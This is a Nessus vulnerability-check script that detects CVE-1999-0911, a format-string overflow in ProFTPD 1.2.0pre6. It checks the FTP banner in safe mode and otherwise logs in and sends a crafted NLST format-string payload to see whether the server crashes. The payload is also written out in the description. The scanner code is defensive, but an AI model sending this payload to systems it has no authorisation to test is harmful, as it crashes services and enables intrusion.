#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10191);
 script_bugtraq_id(612);
 script_version ("$Revision: 1.37 $");
 script_cve_id("CVE-1999-0911");
 script_xref(name:"OSVDB", value:"51720");
 
 script_name(english:"ProFTPD NLST Command Argument Handling Remote Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to crash the remote FTP server by issuing a specially
crafted command, such as 'NLST aaaXXXX%u%[...]%u%u%u%%u%653300u%n'
where 'XXXX' is replaced with four characters - ASCII values 0xDC,
0x4F, 0x07 and 0x08.  This issue is known to affect ProFTPD version
1.2.0pre6, although other FTP servers may be affected as well. 

It is likely that a remote attacker can leverage this issue to execute
arbitrary code on the remote host, subject to the privileges under
which the service runs." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/1999-q3/0974.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/1999-q3/0995.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/1999-q3/1009.html" );
 script_set_attribute(attribute:"solution", value:
"If running ProFTPD, upgrade to version 1.2.0pre7 or later; otherwise,
contact the vendor to see if an update exists." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );
script_end_attributes();

 
 script_summary(english:"Checks if the remote ftp can be buffer overflowed");
 script_category(ACT_MIXED_ATTACK); # mixed
 script_family(english:"FTP");
 
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
		  
 script_dependencie("find_service1.nasl",
 		    "wu_ftpd_overflow.nasl");
 script_require_keys("ftp/login", "Settings/ParanoidReport");
 script_exclude_keys("ftp/ncftpd", "ftp/msftpd");	    
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here : 
#


include("global_settings.inc");
include("ftp_func.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(!get_port_state(port))exit(0);

if (get_kb_item('ftp/'+port+'/broken') ||
    get_kb_item('ftp/'+port+'/backdoor')) exit(0);

# First, we need anonymous access
login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

banner = get_ftp_banner(port:port);


if(!(login) || (safe_checks()))
{
 if(banner)
 {
   if(egrep(pattern:"^220 ProFTPD 1\.2\.0pre[1-6][^0-9]", string:banner))
   {
     report = string(
       "\n",
       "Note that Nessus has determined the vulnerability exists based solely\n",
       "on the following service banner :\n",
       "\n",
       "  ", banner
     );
     security_hole(port:port, extra:report);
   }
 }
 exit(0);
}


soc = open_sock_tcp(port);
if(soc)
{
 if(ftp_authenticate(socket:soc, user:login, pass:password))
 {
  #
  # Solaris's FTPd won't answer to an NLST until a port has been
  # opened to receive the data.
  #
  send(socket:soc, data:string("NLST /\r\n"));
  r = ftp_recv_line(socket:soc);
  if(!r)exit(0); 

  buf = raw_string("aaa", 0xdc, 0x4f, 0x07, 0x08);
  buf = buf + crap(data:"%u", length:72)  + "%653300u%n";
  c = string("NLST ", buf, "\r\n");
  send(socket:soc, data:c);
  b = ftp_recv_line(socket:soc);
  if(!b)security_hole(port);
  close(soc);
 }
}
